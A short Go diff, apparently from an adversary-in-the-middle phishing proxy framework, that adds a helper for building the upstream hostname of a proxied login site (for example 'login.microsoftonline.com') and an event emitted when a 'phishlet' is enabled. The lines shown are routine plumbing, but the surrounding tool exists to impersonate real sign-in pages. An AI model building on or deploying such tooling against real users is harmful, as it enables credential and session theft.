@@ -105,6 +105,15 @@ type ProxyHost struct {
 	AutoFilter     bool
 }
 
+// OriginHost returns the fully qualified upstream hostname
+// (e.g. "login.microsoftonline.com").
+func (h *ProxyHost) OriginHost() string {
+	if h.OrigSubdomain != "" {
+		return h.OrigSubdomain + "." + h.Domain
+	}
+	return h.Domain
+}
+
 // SubFilter is a compiled search/replace rule applied to proxied response bodies.
 type SubFilter struct {
 	Hostname  string
@@ -270,6 +279,7 @@ func (s *PhishletService) Enable(name, hostname, baseDomain, dnsProvider string)
 		return nil, err
 	}
 	s.resolver.Register(p)
+	s.bus.Publish(Event{Type: EventPhishletEnabled, Payload: p})
 	return p, nil
 }
 
